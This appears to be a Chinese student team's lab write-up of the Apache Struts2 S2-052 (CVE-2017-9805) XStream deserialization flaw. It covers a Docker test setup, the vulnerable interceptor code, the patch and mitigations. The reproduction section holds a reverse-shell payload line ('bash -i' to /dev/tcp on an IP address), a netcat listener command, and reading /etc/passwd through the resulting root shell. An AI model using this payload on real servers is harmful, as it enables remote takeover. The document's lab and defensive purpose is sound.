# Apache Struts2 S2-052(CVE-2017-9805)远程代码执行漏洞

## 0x00 漏洞描述

`Apache Struts`是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级`Java Web`应用的开源MVC框架。

`Struts2`是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，`Struts2`作为控制器(Controller)来建立模型与视图的数据交互

2017年9月5日，Apache Struts发布最新安全公告，Apache Struts2的`REST`插件存在远程代码执行的高危漏洞，该漏洞由lgtm.com的安全研究员汇报，漏洞编号为CVE-2017-9805（S2-052）。

Github项目地址: [Vancir/s2-052-reproducing](https://github.com/Vancir/s2-052-reproducing)

## 0x01 漏洞影响

启用Struts REST插件并使用XStream组件对XML进行反序列操作时，未对数据内容进行有效验证，可被攻击者进行远程代码执行攻击(RCE)。

实际场景中存在一定局限性，需要满足一定条件，非struts本身默认开启的组件。

### 影响版本

* Version 2.5.0 to 2.5.12
* Version 2.1.2 to 2.3.33

## 0x02 环境搭建

* Ubuntu 14.04.5
* JDK 8u151
* Struts 2.5.12
* Apache Tomcat 8.0.46

通过建立docker容器来搭建实验环境，保证复现过程的安全性和便
携性。在docker环境中部署好Apache Tomcat，Struts 2以及Java等基础环境。

* 运行以下命令拉取docker镜像

``` bash
sudo -s # docker 需要以root身份运行
docker pull vancir/s2-052 # 从docker cloud上拉取仓库vancir/s2-052到本地
```

* 或使用dockerfile手动生成docker镜像

由于`JDK 8u151`文件较大，因此首先需要使用者从[Oracle官网](http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html)下载并移动到`src`文件夹下(md5sum: `774d8cb584d9ebedef8eba9ee2dfe113`  jdk-8u151-linux-x64.tar.gz)。

然后切换到dockerfile文件所在路径，运行以下命令

``` bash
docker build -t="vancir/s2-052" .
```

* 创建并运行docker容器

``` bash
docker run --name demo -d -p 80:8080 vancir/s2-052 
```

`--name`选项设置docker容器的名称为demo，`-d`选项设置容器在后台运行，`-p`选项设置容器内8080端口映射为本地的80端口，`vancir/s2-052`是我们的docker镜像

docker容器运行完成后，访问`http://localhost`观察到如下页面，即完成实验环境的搭建步骤。

![tomcat.png](/src/tomcat.png)

## 0x03 漏洞攻击复现

### 使用burpsuite直接发送恶意xml

接下来我们就要使用burpsuite发送恶意xml给服务器并反弹一个shell。

首先打开`burp suite`(需到[官网](https://portswigger.net/burp/freedownload)下载安装)，切换到`Repeater`选项卡

将`payload.xml`里的内容全部复制粘贴到`Request`内容框中，并设置右上角的`Target`为`127.0.0.1:80`

这里需要对`payload.xml`的以下内容进行改动，以保证服务器反弹的shell能被我们接收到。

``` xml
<string>bash -i &gt;&amp; /dev/tcp/10.30.178.227/8001 0&gt;&amp;1</string>
```

这条命令为我们反弹一个shell回来。你需要将`10.30.178.227`设置为你本机的IP，`8001`是反弹到你本机的端口号

![burp.png](/src/burp.png)

打开终端，使用`NetCat`监听本地端口`8001`

``` bash
nc -l -p 8001
```

现在`NetCat`正在监听本机的8001端口，我们点击`burp suite`左上方的`Go`按钮提交request，服务器会返回一个responce，同时我们也监听到了一个shell

![nc.png](/src/nc.png)

如图，我们获取了一个root身份的shell，通过shell我们可以执行任意指令(如图`cat /etc/passwd`). 至此漏洞攻击复现完毕。

## 0x04 漏洞分析

漏洞分析部分包括`代码审计`部分以及`补丁分析`部分。

针对Java反序列化漏洞进行探究，明确漏洞原理，漏洞危害等。同时分析Apache Sturts 2.5.13及以上版本中对于该漏洞代码的补丁。

### 漏洞代码

``` java
// filepath: src/plugins/rest/src/main/java/org/apache/struts2/rest/ContentTypeInterceptor.java
public String intercept(ActionInvocation invocation) throws Exception {
    HttpServletRequest request = ServletActionContext.getRequest();
    ContentTypeHandler handler = selector.getHandlerForRequest(request);
    
    Object target = invocation.getAction();
    if (target instanceof ModelDriven) {
        target = ((ModelDriven)target).getModel();
    }
    
    if (request.getContentLength() > 0) {
        InputStream is = request.getInputStream();
        InputStreamReader reader = new InputStreamReader(is);
        handler.toObject(reader, target);
    }
    return invocation.invoke();
}
```
其中的关键漏洞代码在以下：
``` java
InputStream is = request.getInputStream();
InputStreamReader reader = new InputStreamReader(is);
handler.toObject(reader, target);
```

## 0x05 漏洞修复情况

新版本中增加了`XStreamPermissionProvider`，并且对原先有问题的`createXStream`进行重写，增加了校验，拒绝不安全的类执行

## 0x06 Struts 2过往漏洞情况

Apache Struts 2漏洞频发，过往有大量的该产品的漏洞预警。安全分析人士甚至编写有Struts2全漏洞检测脚本。通过对往期Struts2漏洞，分析Struts2常见的攻击方式并总结Struts2的一些修复建议。

## 0x07 S2-052 修复建议

* 升级至`Struts 2.5.13`或`Struts 2.3.34`版本
* 在不使用时移除移除`Struts REST`插件
* 限制REST插件仅处理服务器正常页面和JSON文件
    1. 禁用XML页面处理并限定为以下页面
    ```java
    <constant name="struts.action.extension" value="xhtml,,json" />
    ```
    2. 重载`XStreamHandler`里的`getContentType`方法
    ``` java
    public class MyXStreamHandler extends XStreamHandler { public String getContentType() {
        return "not-existing-content-type-@;/&%$#@";
        }
    }
    ```    
    3. 通过重载struts.xml里的框架来注册处理程序
    ```java
    <bean type="org.apache.struts2.rest.handler.ContentTypeHandler" name="myXStreamHandmer" class="com.company.MyXStreamHandler"/>
    <constant name="struts.rest.handlerOverride.xml" value="myXStreamHandler"/>
    ```
* 在XStreamHandler中进行数据校验或检查

## 0xEE 人员分工

* 组长-陈洪杰：负责项目进度监督，任务调整以及漏洞的深入分析
* 刘松：负责搭建漏洞复现环境，并对漏洞代码以及补丁进行分析
* 林颖萱：负责收集过往Struts2的漏洞分析文章，利用代码及防御策略等
* 李金航：负责收集s2-052漏洞的技术分析文章，利用代码及防御策略等

## 0xFF 参考资料
1. [Using QL to find a remote code execution vulnerability in Apache Struts (CVE-2017-9805)](https://lgtm.com/blog/apache_struts_CVE-2017-9805)

2. [Apache Struts 2 Documentation - Security Bulletins - S2-052](https://cwiki.apache.org/confluence/display/WW/S2-052)

3. [Metasploit Modules Related To CVE-2017-9805](https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream)

4. [Oracle Security Alert Advisory - CVE-2017-9805](http://www.oracle.com/technetwork/security-advisory/alert-cve-2017-9805-3889403.html)
 